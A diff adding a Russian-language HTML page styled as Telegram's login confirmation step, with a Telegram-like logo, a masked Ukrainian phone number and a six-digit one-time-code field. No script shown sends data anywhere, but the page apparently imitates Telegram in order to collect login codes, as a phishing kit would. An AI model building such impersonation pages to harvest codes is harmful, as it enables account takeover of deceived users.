@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Telegram • Подтверждение</title>
+    <link rel="stylesheet" href="css/otp.css" />
+</head>
+
+<body>
+    <div class="tg-wrapper">
+        <div class="tg-login-card">
+            <img id="logoMonkey" src="/media/monkey1.png" alt="Telegram" class="tg-logo" />
+            <h2>Введите код</h2>
+            <p class="tg-subtext">Мы отправили код на <span id="phoneDisplay">+380•••</span></p>
+
+            <div class="form-group">
+                <label for="otpInput">Код подтверждения</label>
+                <input type="text" id="otpInput" maxlength="6" autocomplete="one-time-code" />
+            </div>
+
+            <button id="verifyBtn">Подтвердить</button>
+
+            <div class="tg-footer">
+                <p>Не получили код? <a href="#" id="resendLink">Отправить повторно</a></p>
+                <button id="backBtn" class="back-button">← Назад</button>
+            </div>
+        </div>
+    </div>
+
+</body>
+
+</html>
